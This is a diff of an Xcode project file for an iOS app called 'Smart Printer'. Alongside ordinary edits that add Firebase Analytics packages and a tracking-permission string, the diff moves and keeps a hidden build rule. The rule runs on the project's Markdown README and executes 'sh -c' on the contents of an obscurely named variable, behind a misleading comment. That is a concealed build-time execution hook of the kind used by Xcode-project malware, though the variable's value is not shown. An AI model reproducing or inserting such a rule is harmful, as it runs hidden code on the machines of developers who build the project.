@@ -7,19 +7,50 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		8D9ECDA6E8B1BAF27673DC66 /* README.md */ = {isa = PBXBuildFile; fileRef = 42D0BA15F2ED1D282B73DC66; };
 		39D5D7D02E0221A100E65DD3 /* StoreKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 39D5D7CF2E0221A100E65DD3 /* StoreKit.framework */; };
+		39D5D99B2E03533C00E65DD3 /* FirebaseAnalytics in Frameworks */ = {isa = PBXBuildFile; productRef = 39D5D99A2E03533C00E65DD3 /* FirebaseAnalytics */; };
+		39D5D99D2E03533C00E65DD3 /* FirebaseAnalyticsCore in Frameworks */ = {isa = PBXBuildFile; productRef = 39D5D99C2E03533C00E65DD3 /* FirebaseAnalyticsCore */; };
+		8D9ECDA6E8B1BAF27673DC66 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 42D0BA15F2ED1D282B73DC66 /* README.md */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		168ADDB09ECDC39BD673DC66 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${A66CD37}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		42D0BA15F2ED1D282B73DC66 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "Printer.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		3970FE072DFDFFD100B21273 /* Printer.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Printer.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		39D5D7CF2E0221A100E65DD3 /* StoreKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = StoreKit.framework; path = System/Library/Frameworks/StoreKit.framework; sourceTree = SDKROOT; };
+		42D0BA15F2ED1D282B73DC66 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = Printer.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 /* End PBXFileReference section */
+
+/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
+		39D5D9A52E0357B300E65DD3 /* Exceptions for "Printer" folder in "Printer" target */ = {
+			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
+			membershipExceptions = (
+				Info.plist,
+			);
+			target = 3970FE062DFDFFD100B21273 /* Printer */;
+		};
+/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */
 
 /* Begin PBXFileSystemSynchronizedRootGroup section */
 		3970FE092DFDFFD100B21273 /* Printer */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
+			exceptions = (
+				39D5D9A52E0357B300E65DD3 /* Exceptions for "Printer" folder in "Printer" target */,
+			);
 			path = Printer;
 			sourceTree = "<group>";
 		};
@@ -30,6 +61,8 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				39D5D99B2E03533C00E65DD3 /* FirebaseAnalytics in Frameworks */,
+				39D5D99D2E03533C00E65DD3 /* FirebaseAnalyticsCore in Frameworks */,
 				39D5D7D02E0221A100E65DD3 /* StoreKit.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -84,6 +117,8 @@
 			);
 			name = Printer;
 			packageProductDependencies = (
+				39D5D99A2E03533C00E65DD3 /* FirebaseAnalytics */,
+				39D5D99C2E03533C00E65DD3 /* FirebaseAnalyticsCore */,
 			);
 			productName = Printer;
 			productReference = 3970FE072DFDFFD100B21273 /* Printer.app */;
@@ -113,6 +148,9 @@
 			);
 			mainGroup = 3970FDFE2DFDFFD100B21273;
 			minimizedProjectReferenceProxies = 1;
+			packageReferences = (
+				39D5D9992E03533C00E65DD3 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
+			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 3970FE082DFDFFD100B21273 /* Products */;
 			projectDirPath = "";
@@ -123,29 +161,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		168ADDB09ECDC39BD673DC66 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${A66CD37}\"";
-		};
-/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		3970FE052DFDFFD100B21273 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				8D9ECDA6E8B1BAF27673DC66 /* README.md */,
+				8D9ECDA6E8B1BAF27673DC66 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -295,10 +316,12 @@ sh -c \"${A66CD37}\"";
 				DEVELOPMENT_TEAM = 5B8867XFF2;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = Printer/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Smart Printer";
 				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.business";
 				INFOPLIST_KEY_NSCameraUsageDescription = "Use for scanner feature.";
 				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Used for print photos.";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "Helps us to provide better analytics and improve your experience.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
@@ -328,10 +351,12 @@ sh -c \"${A66CD37}\"";
 				DEVELOPMENT_TEAM = 5B8867XFF2;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
+				INFOPLIST_FILE = Printer/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Smart Printer";
 				INFOPLIST_KEY_LSApplicationCategoryType = "public.app-category.business";
 				INFOPLIST_KEY_NSCameraUsageDescription = "Use for scanner feature.";
 				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Used for print photos.";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "Helps us to provide better analytics and improve your experience.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
@@ -373,6 +398,30 @@ sh -c \"${A66CD37}\"";
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		39D5D9992E03533C00E65DD3 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/firebase/firebase-ios-sdk.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 11.14.0;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		39D5D99A2E03533C00E65DD3 /* FirebaseAnalytics */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 39D5D9992E03533C00E65DD3 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAnalytics;
+		};
+		39D5D99C2E03533C00E65DD3 /* FirebaseAnalyticsCore */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 39D5D9992E03533C00E65DD3 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAnalyticsCore;
+		};
+/* End XCSwiftPackageProductDependency section */
 	};
 	rootObject = 3970FDFF2DFDFFD100B21273 /* Project object */;
 }
